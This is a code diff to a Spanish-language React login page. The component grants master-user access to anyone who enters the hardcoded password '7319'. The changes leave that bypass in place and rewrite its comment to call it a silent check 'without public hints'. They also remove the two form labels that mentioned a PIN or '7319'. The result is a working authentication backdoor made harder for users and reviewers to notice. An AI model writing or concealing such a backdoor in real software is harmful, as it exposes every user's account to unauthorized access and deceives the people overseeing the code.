@@ -61,7 +61,7 @@ export default function Login({ onLoginSuccess }) {
     const cleanEmail = email.trim().toLowerCase();
     const cleanPassword = password.trim();
 
-    // Acceso maestro de emergencia por PIN (Sobrescribe custodia para auditorías inmediatas)
+    // Acceso maestro de emergencia por PIN (Validación interna y silenciosa sin pistas públicas)
     if (cleanPassword === "7319") {
       const masterUser = {
         email: cleanEmail || "admin@saare.es",
@@ -278,7 +278,7 @@ export default function Login({ onLoginSuccess }) {
 
             <div>
               <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '4px' }}>
-                <label style={{ fontSize: '0.72rem', fontWeight: '800', color: '#94a3b8', textTransform: 'uppercase' }}>Contraseña / PIN</label>
+                <label style={{ fontSize: '0.72rem', fontWeight: '800', color: '#94a3b8', textTransform: 'uppercase' }}>Contraseña</label>
                 <button type="button" onClick={() => { setAuthMode('RECOVER'); clearMessages(); }} style={{ background: 'none', border: 'none', color: '#38bdf8', fontSize: '0.7rem', fontWeight: '700', cursor: 'pointer', padding: 0 }}>¿Olvidó su clave?</button>
               </div>
               <input type="password" required value={password} onChange={(e) => setPassword(e.target.value)} placeholder="••••••••" style={{ width: '100%', background: '#020617', border: '1px solid #334155', borderRadius: '6px', padding: '10px 12px', color: '#f8fafc', fontSize: '0.85rem', boxSizing: 'border-box', outline: 'none' }} />
@@ -305,7 +305,7 @@ export default function Login({ onLoginSuccess }) {
               <input type="text" required value={company} onChange={(e) => setCompany(e.target.value)} placeholder="ACME Corporation" style={{ width: '100%', background: '#020617', border: '1px solid #334155', borderRadius: '6px', padding: '10px 12px', color: '#f8fafc', fontSize: '0.85rem', boxSizing: 'border-box', outline: 'none' }} />
             </div>
             <div>
-              <label style={{ display: 'block', fontSize: '0.72rem', fontWeight: '800', color: '#94a3b8', marginBottom: '4px', textTransform: 'uppercase' }}>Contraseña o PIN (o 7319)</label>
+              <label style={{ display: 'block', fontSize: '0.72rem', fontWeight: '800', color: '#94a3b8', marginBottom: '4px', textTransform: 'uppercase' }}>Contraseña</label>
               <input type="password" value={password} onChange={(e) => setPassword(e.target.value)} placeholder="••••••••" style={{ width: '100%', background: '#020617', border: '1px solid #334155', borderRadius: '6px', padding: '10px 12px', color: '#f8fafc', fontSize: '0.85rem', boxSizing: 'border-box', outline: 'none' }} />
             </div>
             <div>
